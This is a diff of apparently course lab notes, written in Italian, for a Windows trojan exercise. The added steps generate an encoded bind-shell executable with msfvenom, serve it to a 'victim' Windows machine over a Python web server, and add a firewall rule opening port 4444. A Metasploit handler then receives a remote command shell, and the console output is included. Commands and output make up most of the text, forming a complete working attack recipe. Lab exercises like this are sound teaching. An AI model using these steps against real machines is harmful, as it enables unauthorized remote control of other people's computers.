@@ -1,11 +1,99 @@
-┌──(kali㉿kali)-[~/cybersecurity_academy/LAB_08/Trojan/TROJAN_WINDOW]
-└─$ sudo msfvenom -a x86 --platform windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai LPORT=4444 -f exe -o evilProgram.exe
-[sudo] password for kali: 
-Found 1 compatible encoders
-Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
-x86/shikata_ga_nai succeeded with size 353 (iteration=0)
-x86/shikata_ga_nai chosen with final size 353
-Payload size: 353 bytes
-Final size of exe file: 73802 bytes
-Saved as: evilProgram.exe
+DA KALI
+1 - Apri un terminale ed esegui questi comandi 
+sudo msfvenom -a x86 --platform windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai LPORT=4444 -f exe -o evilProgram.exe
+Ti creerà un file exe malevolo.
+
+2 - DALLA MACCHINA WINDOWS VITTIMA
+  - Scarica i file "evilProgram.exe" generato nella macchina kali e lo inserisci in una cartella
+2.1 - un modo comodo per scaricare il file nella stessa sottorete è utilizzare il comando dal terminale di kali nella cartella interessata 'sudo python3 -m http.server 80' 
+2.2 - accedere dalla macchina Windows dal browser e ricerca http://<IP MACCHINA KALI>/
                              
+3 - Apri un altro ternimale ed esegui questo comando
+──(kali㉿kali)-[~]
+└─$ sudo msfconsole
+[sudo] password for kali: 
+Metasploit tip: Save the current environment with the save command, 
+future console restarts will use this environment again
+                                                  
+
+     .~+P``````-o+:.                                      -o+:.
+.+oooyysyyssyyssyddh++os-`````                        ```````````````          `
++++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o
+++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy
+--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///
+                                `...............`              `...-/////...`
+
+
+                                  .::::::::::-.                     .::::::-
+                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo
+                                 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&&MMMMMMMMMMMMMMy
+                                 .sm/`-yMMMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMMh`
+                                  -Nd`  :MMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMh`
+                                   -Nh` .yMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMm/
+    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMm/
+      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMd
+    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/
+    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:
+          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+
+          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::
+          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||
+........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........
+================================================================================
+=====================+--------------------------------+=========================
+=====================| Session one died of dysentery. |=========================
+=====================+--------------------------------+=========================
+================================================================================
+
+                     Press ENTER to size up the situation
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+                        Press SPACE BAR to continue
+
+
+
+       =[ metasploit v6.4.84-dev                                ]
++ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,683 payloads     ]
++ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf exploit(multi/handler) > set payload windows/shell/bind_tcp
+payload => windows/shell/bind_tcp
+msf exploit(multi/handler) > set RHOST <IP MACCHINA WINDOWS>
+RHOST => <IP MACCHINA WINDOWS>
+msf exploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+msf exploit(multi/handler) > run
+[*] Started bind TCP handler against <IP MACCHINA WINDOWS>:4444
+
+4 - Dalla macchina windows apri la Administrator PowerShell e lancia il comando
+netsh advfirewall firewall add rule name="Apertura Porta 4444" protocol=TCP dir=in localport=4444 action=allow
+
+5 - Dalla Macchina Windows avvia il programma come Amministratore
+  - Dal terminale della macchina Kali ora uscirà:
+
+
+[*] Sending stage (240 bytes) to <IP MACCHINA WINDOWS>
+[*] Command shell session 1 opened (<IP MACCHINA KALI>:33993 -> <IP MACCHINA WINDOWS>:4444) at 2025-11-04 11:07:58 -0500
+
+
+Shell Banner:
+Microsoft Windows [Version 6.1.7601]
+-----          
+
+<SHELL MACCHINA WINDOWS>
+
+
+
+
+
